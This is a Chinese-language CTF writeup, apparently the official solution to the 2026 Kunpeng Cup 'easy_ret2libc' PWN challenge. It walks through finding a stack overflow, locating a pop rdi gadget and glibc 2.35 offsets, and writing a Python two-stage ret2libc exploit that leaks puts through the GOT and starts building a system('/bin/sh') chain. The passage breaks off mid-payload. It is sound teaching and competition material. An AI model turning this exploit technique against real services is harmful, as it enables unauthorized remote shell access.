---
title: 【2026鲲鹏杯】PWN方向Writeup
url: https://mp.weixin.qq.com/s/EF3IG30UJ4XS5qT3OXRRxA
source: Doonsec's feed
date: 2026-11-13
fetch_date: 2026-11-14T08:17:00.154494
---

# 【2026鲲鹏杯】PWN方向Writeup

# 【2026鲲鹏杯】PWN方向Writeup

鱼影安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

编者荐语：

2026鲲鹏杯-PWN方向官方WP

以下文章来源于云晞科技Sec
，作者鲲鹏杯组委会

![](https://wx.qlogo.cn/mmhead/uI5pczeERTZqp0sD97WA7qBqy6ibUHsZm4lhicSpR5icrNzcMUPHj2KOgCy7VPmrdVhEGPm3azP0nM/0)

**云晞科技Sec**
.

这里是网络安全探索基地！专注分享流量分析实战技巧、应急响应解决方案，深度剖析Web安全漏洞攻防。同时带来CTF竞赛解题思路与精彩笔记，助你快速掌握前沿技术，提升安全技能，共同筑牢数字世界安全防线！

## easy\_ret2libc

![](https://mmbiz.qpic.cn/mmbiz_jpg/A79OztZnWVkfcfXhQuFAjJbU0IZngAicCCI6biagk6vVIOgAv0HD9TdTz3Jic3993D3IzTrEBDQvdQb8m7OCG8TIL82GCVpbtAOhiahCbYNg288/640?wx_fmt=webp&from=appmsg)

这道题的题面就一句话：你会 ret2libc 吗。

刚学 PWN 不久的话，我希望这篇看完可以让你跟着一步步做出来。

先解释一下 ret2libc 是怎么回事。程序开了 NX（栈不可执行）之后，我们就没法把 shellcode 放在栈上执行，但 libc 里有现成的 `system` 函数，执行 `system("/bin/sh")` 就能开一个 shell。所以思路很清晰：想办法让程序跳到 libc 里的 `system`，参数给它 `"/bin/sh"`。

关键在地址。系统开了 ASLR，libc 每次加载的基址都不一样，我们不知道 `system` 到底在哪。所以整个 exploit 分两步走：

第一步，利用栈溢出让程序把 libc 里 `puts` 函数的真实地址打印出来。有了这个地址，减去 `puts` 在 libc 文件里固定的偏移，就算出了 libc 基址，`system` 和 `"/bin/sh"` 的真实位置也随之可得。

第二步，再溢出一次，这次让程序跳进 `system`，参数给 `"/bin/sh"`，shell 到手。

### 附件都有什么

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVnHrR5KTfiaiazxBAPMAP4K6XlQyxPxvZicE3iaxS10vEFGnicYV5v1xKE6QHerGibel0BNYptZrMxzrdFaX8y5aAWza0pEaQibWUXuF8/640?wx_fmt=webp&from=appmsg)

*图1　附件清单与文件类型*

三个文件。`chall` 是题目程序，没剥符号，反汇编出来函数名是全的。`libc.so.6` 和 `ld-linux-x86-64.so.2` 是线上环境用的那套运行库，不用自己去猜 libc 版本。

我本地是 macOS，直接在 Terminal 里做的，工具就两样，pip 装一下：

```
pip3 install pwntools ropgadget
```

装完就有 `ROPgadget` 命令；`checksec` 如果没有，用 pwntools 自带的 `pwn checksec ./chall`，效果一样。反汇编（也可以使用ida，图形化界面更直观）用系统自带的 `objdump`。Windows 用户建议直接开个 Kali 或 Ubuntu 虚拟机，方便的多。

### 一、先摸清楚程序的底细

#### （一）用 checksec 看保护

![](https://mmbiz.qpic.cn/mmbiz_jpg/A79OztZnWVmLYib6FNwiaLVzC3WINn2d1Kul2FvBSu9NGpXqwAVEmwEkiayo9qHVNfj6ZMIwZChvX85ttG2RqP3FAlDPP7yRHhKnaoRyKqE9XU/640?wx_fmt=webp&from=appmsg)

*图2　checksec 保护机制*

checksec 用来查二进制开了哪些保护，逐行翻译成人话：

（1）**Arch: amd64-64-little**，64 位小端，常规。

（2）**RELRO: Partial RELRO**，GOT 表可写。这道题用不上这个点，知道就行。

（3）**Stack: No canary found**，栈上没有金丝雀。正常函数返回前会检查栈上那个随机值有没有被改，没有 canary 意味着我们溢出时可以一路写到返回地址，不会被半路拦下。

（4）**NX: NX enabled**，栈不可执行。往栈上写的数据只能当数据用，不能当代码执行，所以不能注 shellcode，得换路子，这就引出了 ROP。

（5）\*\*PIE: No PIE (0x400000)\*\*，程序加载地址固定从 0x400000 开始，程序里每个函数、每条指令的地址都是死的，exploit 里直接写死就行。

合起来看，路线已经很清楚：能溢出（无 canary）、必须 ROP（NX）、程序内的地址可以硬编码（无 PIE）。libc 的地址是随机的，这个等会儿用泄露来填。

#### （二）反汇编：找到溢出点

用 objdump 把程序拆开看：

```
objdump -d -M intel --no-show-raw-insn chall
```

`-M intel` 是让输出用 Intel 语法，读起来顺一些。在输出里找到 `vuln` 函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVm0FjCDYiaicSKIKx23wlad4TNHxPRgRSOLESnzn4FFkHibOibNeYC74kt0ZkD5cBcnuW2wTlpKjicicXNDdvDAyfL8Y2jr7H80FXXjM/640?wx_fmt=webp&from=appmsg)

*图3　vuln 反汇编：buf 只有 0x20，read 却读 0x100*

逐行看关键的部分：

```
401183:  push  rbp               ; 函数开头: 把上一层的 rbp 存起来
401187:  mov   rbp, rsp          ; 建立自己的栈帧
40118b:  sub   rsp, 0x20         ; 栈上分配 0x20 = 32 字节局部变量
...
4011ad:  lea   rax, [rbp - 0x20] ; 取 buf 的地址 = rbp 往低 32 字节
4011b1:  mov   edx, 0x100        ; read 第三个参数: 读 256 字节
4011b6:  mov   rsi, rax          ; 第二个参数: buf
4011b9:  mov   edi, 0x0          ; 第一个参数: 0, 即标准输入
4011be:  call  0x401070          ; read(0, buf, 0x100)
```

buf 只有 32 字节，read 却要读 256 字节，明显的栈溢出。画出栈的布局就一目了然（栈从高地址往低地址生长）：

```
低地址
+----------------------+ <- buf 起点 = rbp-0x20
|   buf, 32 字节        |
+----------------------+ <- rbp
|   保存的旧 rbp, 8 字节 |
+----------------------+ <- rbp+8
|   返回地址, 8 字节     |  <- 溢出要覆盖的目标
+----------------------+
|   再往上还有空间        |
高地址
```

从 buf 开头到返回地址，隔着 buf 本身 32 字节，再加保存的 rbp 8 字节，所以填充要 40 字节，从第 41 字节开始写的东西会正好落在返回地址上。这个 40 就是代码里的 OFFSET。

read 最多读 256 字节，40 字节填充之后还剩 216 字节给我们摆东西，放一串 ROP 链绰绰有余。

#### （三）找趁手的 gadget

ROP 的思路是：在程序里找一截一截以 `ret` 结尾的小指令片段（叫 gadget），把它们的首地址像串珠子一样排在返回地址的位置上。程序每次 `ret` 就执行一粒，珠子串起来就能凑出我们想要的逻辑。

现在最需要的是能给 `rdi` 寄存器赋值的 gadget。x86-64 的调用约定里第一个参数走 rdi，后面不管调 `puts` 还是调 `system` 都得靠它传参。这道题直接在 `gift` 函数里塞了一个：

![](https://mmbiz.qpic.cn/mmbiz_jpg/A79OztZnWVkRk3TDJUyyQT0Ov55k11DmZ58gsDnNWWOicnhjeng0Takic47uIEngH2qlQbdSyEibnhCVgC2NfAdXsY9xAbrkvoictaVsX3Dl2sA/640?wx_fmt=webp&from=appmsg)

*图4　gift 反汇编 + ROPgadget 验证*

`0x40117e` 处的 `pop rdi ; ret`：执行时把栈顶的值弹进 rdi，然后 `ret` 跳到栈上再下一个值。它紧挨着的 `0x40117f` 还有一个单独的 `ret`，先记住，等会儿栈对齐的时候它是很重要的。

用 ROPgadget 验证一遍，命令和结果都在上图里，确认 `0x40117e : pop rdi ; ret`。

#### （四）记下 libc 里三样东西的位置

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVmebicIe8ak8M1ibuVOSphZPq911Iibgh8hlkVyvrGK0s2LaKbPebzClmPO8AgicLBUfWf7n4IfFnJJkMGyQvsJ3ibXT9XoCiaobTRCo/640?wx_fmt=webp&from=appmsg)

*图5　libc 版本与符号偏移*

附件的 libc 里我们要记下三个东西的偏移（偏移 = 它们在 libc 文件内部的位置，永远不变）：

（1）puts，0x80e10，等会儿靠它泄露

（2）system，0x50d70，最终目标

（3）"/bin/sh" 字符串，0x1d8678，system 的参数

版本是 glibc 2.35。偏移用 pwntools 就能查，也可以用 `readelf -s libc.so.6` 自己翻：

```
python3 -c "from pwn import ELF; l = ELF('libc.so.6'); print(hex(l.symbols['system']))"
```

### 二、正常连一次靶机

写 exploit 之前，先当一次普通玩家，用 nc 连上去看看程序正常的样子：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/A79OztZnWVlELcNibDhHV7WCIZlEa4gzQVd31GIPUjTMd5TL8ib72icmxeTAcNkxxrnzribXbHPyQ1WGpdc1d8yTtdJwfrjedvjJYmiaqwRHgBmA/640?wx_fmt=webp&from=appmsg)

*图6　nc 正常交互*

nc 靶机地址 9999（因为部署在自己服务器复现所以端口是9999）

程序先打五行提示（main 里三行、vuln 里两行），然后等输入，收到名字后回一句 `Nice to meet you!`，最后 `Byebye~` 正常退出。记住这个流程，等会儿 exploit 的输出要对着它看。

这里有个后面要用到的细节。程序调 `puts` 时不是直接跳进 libc，而是先经过 PLT 跳板，跳板再去查 GOT 表，GOT 表里存的才是 `puts` 的真实地址。这个地址是在 `puts` 第一次被调用时才填进去的，叫懒绑定。我们的 exploit 正好占这个便宜：banner 阶段程序已经调过 `puts` 好几次，所以等我们溢出时 GOT 里存的已经是真实地址，读它就能拿到 libc 的位置。

### 三、动手写 exploit

#### （一）思路：为什么分两步

前面说了 libc 基址每次都不同（ASLR，地址空间随机化），但它内部函数之间的相对距离永远不变。也就是说 `system` 的真实地址 = 基址 + 0x50d70，基址不知道，后面全是白搭。

所以分两步：先一步拿到任意一个 libc 函数的真实地址（选 puts，因为程序里现成能调它），反推出基址；第二步精确打击。第一步走完还得有机会走第二步，所以泄露完让程序跳回 vuln 的入口，再溢出一轮。

#### （二）完整代码

注释写得比较细，配合后两张截图看：

```
# easy_ret2libc —— ret2libc 两段式 exploit
# 用法: python3 exp.py <靶机IP> <端口>
# 只用了 Python 标准库, 不装 pwntools 也能跑
import re
import socket
import struct
import sys
import time

# ---------- 下面这些常量都来自对附件的静态分析 ----------
# 程序不开 PIE, 所以这些地址是固定的, 换台机器跑也一样
POP_RDI  = 0x40117e   # gift() 里送的 gadget: pop rdi ; ret, 用来给函数传第一个参数
RET      = 0x40117f   # 紧挨着的一个单独 ret, 当"栈对齐垫片"用(见 WP 坑1)
PUTS_PLT = 0x401064   # puts 的 PLT 地址, 调它等于调 puts
PUTS_GOT = 0x404018   # GOT 表里存 puts 真实地址的那个格子
VULN     = 0x401183   # vuln() 的入口地址, 第一段打完跳回这里再来一轮
OFFSET   = 40         # 从 buf 开头到返回地址的距离: buf 32 字节 + 保存的 rbp 8 字节

# ---------- 配套 libc (Ubuntu 22.04, glibc 2.35) 里的偏移 ----------
# 运行时真实地址 = libc基址 + 这里的偏移, 基址每次连接都不一样(ASLR)
PUTS_OFF   = 0x80e10
SYSTEM_OFF = 0x50d70
BINSH_OFF  = 0x1d8678   # 字符串 "/bin/sh" 在 libc 里的位置

host, port = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((host, port), timeout=20)

def rx(wait=2.0):
    """收数据, 超过 wait 秒没新数据就返回"""
    s.settimeout(wait)
    data = b''
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            data += d
    except socket.timeout:
        pass
    return data

# ========== 第一步: 连上去, 把 banner 收完 ==========
banner = rx(2.5)
print('[*] banner:')
print(banner.decode('latin1'))

# ========== 第二段思路的第一半: 溢出 -> 泄露 libc 地址 -> 跳回 vuln ==========
# payload 布局: 40 字节填充 + 4 个 8 字节地址
#   pop rdi      <- 返回地址先落到这, 它把下一个值弹进 rdi
#   puts@got     <- 被弹进 rdi, 当 puts 的参数
#   puts@plt     <- 调 puts, 把 GOT 里存的真地址打印出来
#   vuln 入口    <- puts 返回后落到这, 重新来一轮, 等我们发第二段
p1 = b'A' * OFFSET + struct.pack('<QQQQ', POP_RDI, PUTS_GOT, PUTS_PLT, VULN)
s.sendall(p1)
print(f'[*] stage1: overflow({OFFSET}) + pop rdi/puts@got/puts@plt/back-to-vuln, {len(p1)} bytes')

data = rx(2.5)
print('[*] stage1 recv:', data)
# puts 打印到 \x00 为止, 所以地址只有前 6 字节, 后面补 0 再按小端转成整数
leak = re.search(rb'Nice to meet you!\n([^\n]*)\n', data).group(1)
puts_addr = int.from_bytes(leak.ljust(8, b'\x00'), 'little')
base = puts_addr - PUTS_OFF
assert base & 0xfff == 0, f'bad leak: {leak!r}'   # 基址低12位必为0, 不对说明泄露错了
print(f'[*] puts runtime addr = {hex(puts_addr)}')
print(f'[*] libc base         = {hex(base)}  (page-aligned check OK)')

# ========== 第二段: 再溢出一次, 这次直接调 system("/bin/sh") ==========
p2 = b'B' * OFFSET + struct.pack('<QQQQ',
                                 RET,                  # ...